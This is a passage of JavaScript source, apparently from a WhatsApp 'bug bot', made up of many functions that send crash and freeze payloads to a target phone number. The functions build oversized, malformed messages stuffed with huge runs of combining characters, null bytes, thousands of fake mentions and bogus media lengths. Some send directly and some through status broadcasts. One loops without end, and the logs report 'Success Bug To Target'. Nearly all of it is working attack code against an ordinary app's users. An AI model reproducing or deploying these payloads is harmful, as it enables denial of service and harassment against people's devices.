  await Abim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
} 
async function WolkerBlank(target) {
  try {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: "Abim Is Here" + "ោ៝".repeat(75000),
        caption: "Hi ./Abimklz" + "ោ៝".repeat(70000),
        inviteExpiration: "999999999",
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "𝙆𝙚𝙣𝙖𝙡 𝙖𝙗𝙞𝙢¿?" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };

    await Abim.relayMessage(target, msg, {
      participant: { jid: target },
      messageId: null,
    });

    console.log(`☀️ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁 ${target}`);
  } catch (err) {
    console.error("❌ SyncBlank error:", err);
  }
}
async function storyOfMyLive(sock, target, mention = true) {
try {
while (true) {
const msg = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
nativeFlowResponseMessage: {
version: 3,
name: "call_permission_request",
paramsJson: "\u0000".repeat(1045000)
},
body: {
text: "𝗔𝗕𝗜𝗠... 桜🌸",
format: "DEFAULT"
}
}
}
}
},
{
isForwarded: false,
ephemeralExpiration: 0,
background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
forwardingScore: 0,
font: Math.floor(Math.random() * 9)
}
)
await Abim.relayMessage("status@broadcast", msg.message, {
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: undefined }
]
}
]
}
],
statusJidList: [target],
messageId: msg.key.id
})
if (mention) {
await Abim.relayMessage(
target,
{
statusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
},
{}
)
}
await sleep(1500)
}
} catch (err) {}
}
async function CrashXFreeze(target) {
  const cards = [];
   
    let buttonsFreze = [];

    buttonsFreze.push({
      name: "galaxy_message",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(8000),
      }),
    });
    
    for (let i = 0; i < 2000; i++) {
      buttonsFreze.push({
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(9000),
        }),
      });
    }
    
    buttonsFreze.push({
      name: "cta_copy",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(9000), 
      }),
    });

    const MSG = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: '', 
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "ꦽ", 
                address: "ោ៝", 
              },
            },
            body: {
              text: "❏𝕱𝖗𝖊𝖆𝖉 𝕴𝖘 𝕳𝖊𝖗𝖊❐" +
                    "ꦾ࣯࣯".repeat(90000) +
                    "⇆".repeat(25000) +
                    "@1".repeat(25000),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
                buttons: buttonsFreze,
            }
          },
        },
      },
    };

  await Abim.relayMessage(target, MSG, {
    participant: { jid: target },
    messageId: null
  });
  console.log(chalk.blue(`Succes Sending Bug To ${target}`));
}  
async function KelraxX(target) {
  const ButtonFreeze = [
    {
      name: "single_select",
      buttonParamsJson: ""
    },
  ];

  for (let i = 0; i < 20; i++) {
    ButtonFreeze.push(
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          status: true,
        })
      },
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000)
        })
      },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000)
        })
      },
    );
  }

  const complexData = Array.from({ length: 1000 }, () => ({
    id: Math.random().toString(36).substr(2, 9),
    data: "D̑̈Ȃ̈N̑̈D̑̈Ȇ̈L̑̈Ȋ̈Ȏ̈N̑̈".repeat(100),
  }));

  await Abim.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "D̑̈Ȃ̈N̑̈D̑̈Ȇ̈L̑̈Ȋ̈Ȏ̈N̑̈៚",
              locationMessage: {
                degreesLatitude: 0,
                degreesLongtitude: 0,
              },
              hasMediaAttachMent: true,
            },
            body: {
              text: "ោ៝".repeat(20000) + "ꦾ".repeat(60000),
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify(complexData),
              buttons: ButtonFreeze,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "628155555555@s.whatsapp.net",
                ...Array.from({ length: 1990 }, () => `1${Math.floor(Math.random() * 5000000)}`
                ),
              ],
              forwadingScore: 100,
              isForwaded: true,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1844000
                },
              },
            },
          },
        },
      },
    },
    {}
  );

  await Abim.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                paymentInviteMessage: {
                  serviveType: 1,
                  expiryTimestamp: null,
                },
              },
            },
            caraoselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                    title: "ោ៝".repeat(20000),
                    imageMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                      fileLength: "9999999999999",
                      height: 9999,
                      width: 9999,
                      mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                      fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                      directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1755254367",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
                    },
                    hasMediaAttachMent: true,
                  },
                  body: {
                    text: "D̑̈Ȃ̈N̑̈D̑̈Ȇ̈L̑̈Ȋ̈Ȏ̈N̑̈",
                  },
                  nativeFlowMessage: {
                    messageParamsJson: JSON.stringify(complexData),
                    buttons: ButtonFreeze,
                  },
                },
              ],
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}
async function XyrUiXDelayT(target, type) {
try {
let char
switch(type) {
case 1: {char = "ꦃ".repeat(333333)} break
case 2: {char = "ꦸ".repeat(333333)} break
case 3: {char = "ꦾ".repeat(333333)} break
case 4: {char = "ꦹ".repeat(333333)} break
case 5: {char = "ꦽ".repeat(333333)} break
case 6: {char = "ꦺ".repeat(333333)} break
case 7: {char = "ꦿ".repeat(333333)} break
case 8: {char = "꧀".repeat(333333)} break
default: 
console.log("Invalid type")
}
Abim.relayMessage(target, {
"interactiveMessage": {
    "header": {
        "title": "t§m" + char
    },
    "body": {
        "text": "Hello Im Abim-"
    },
    "carouselMessage": {
    
    }
}
},{})
} catch (x) {console.log(x)}
}
async function MediaInvis(target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Awas Air Panas",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await Abim.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await Abim.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await Abim.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}
async function SaturnuZLay2(target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await Abim.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`🌸 Sending bug to: ${target}`))
}
async function CrashRidz(sock,target) {
  try {
    let message = {
      extendedTextMessage: {
        text: "ABIM VS MARK" + "ꦾ".repeat(10000),
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["13135550002@s.whatsapp.net"],
          externalAdReply: {
            title: null,
            body: null,
            thumbnailUrl: "http://wa.me/stickerpack/ꦽ" + "...".repeat(5000),
            sourceUrl: "http://wa.me/stickerpack/ꦽ" + "...".repeat(5000),
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{}",
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}"
              }, 
              {
              name: "template_message",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    };

    await Abim.relayMessage(target, message, {
      participant: { jid: target }
    });
  } catch (err) {
    console.log(err);
  }
}
async function protocolbug5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "C O S M O ✦ H A D E S",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Abim.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}  
async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "VALORES ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Abim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Abim.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
async function blankVy(target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "XxX" + "ោ៝".repeat(50000),
      caption: "XxX" + "ꦾ".repeat(90000) + "ោ៝".repeat(90000),
      inviteExpiration: "999999999",
    },
  };

  await Abim.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  console.log("🧪 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁");
}
async function Bimblankv2(target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          nativeFlowResponseMessage: {
            version: 3,
            ephemeralMessage: {
              message: {
                interactiveMessage: {
                  newsletterAdminInviteMessage: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "XxX" + "ោ៝".repeat(20000),
                    caption: "ᏑABIM IS HERE BRO?" + "ោ៝".repeat(17300),
                    inviteExpiration: "999999999",
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "ꦾ ",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({
                          status: true,
                        }),
                      },
                      {
                        name: "cta_url",
                        buttonParamsJson: "ꦾ".repeat(5500),
                        version: 3,
                      },
                      {
                        name: "cta_call",
                        buttonParamsJson: "ꦾ".repeat(4500),
                        version: 3,
                      },
                      {
                        name: "cta_copy",
                        buttonParamsJson: "ꦾ".repeat(3500),
                        version: 3,
                      },
                      {
                        name: "cta_reminder",
                        buttonParamsJson: "ꦾ".repeat(5500),
                        version: 3,
                      },
                      {
                        name: "cta_cancel_reminder",
                        buttonParamsJson: "ꦾ".repeat(3500),
                        version: 3,
                      },
                      {
                        name: "address_message",
                        buttonParamsJson: "ꦾ".repeat(2500),
                        version: 3,
                      },
                      {
                        name: "send_location",
                        buttonParamsJson: "ꦾ".repeat(4500),
                        version: 3,
                      },
                      {
                        name: "quick_reply",
                        buttonParamsJson: "ꦾ".repeat(2500),
                        version: 3,
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "ꦾ",
                      },
                    ],
                  },
                },
              },
            },
          },
        },
      },
    },
  };

  await Abim.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  console.log("🚀 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁");
}
async function MonkeyDelay(sock, target) {
const msg = {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "#Abim Is Commback" + "ꦽ".repeat(90696),
format: "EXTENSIONS_1",
},
nativeFlowResponseMessage: {
name: "galaxy_message",
paramsJson: `{"screen_2_OptIn_0":true,"screen_2_OptIn_1":true,"screen_1_Dropdown_0":"4𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ","screen_1_DatePicker_1":"1028995200000","screen_1_TextInput_2":"DelayHard","screen_1_TextInput_3":"94643116","screen_0_TextInput_0":"#3izxvelzExerc1st. ‌${"\u0000".repeat(1045000)}","screen_0_TextInput_1":"INFINITE","screen_0_Dropdown_2":"001-Grimgar","screen_0_RadioButtonsGroup_3":"0_true","flow_token":"AQAAAAACS5FpgQ_cAAAAAE0QI3s."}`,
version: 3,
},
},
},
},
};

await Abim.relayMessage("status@broadcast", msg, {
messageId: Date.now().toString(),
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: [] }
]
}
]
}
]
});

console.log("📵 Success Send Bug SyncDelay");
await new Promise(resolve => setTimeout(resolve, 5000));
}
async function crashphoto(target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(20000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "ABIM X WOLKER"
        },
        "header": { 
          "title": 'do i care¿' + "\u0000".repeat(50000),
          "hasMediaAttachment": false,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
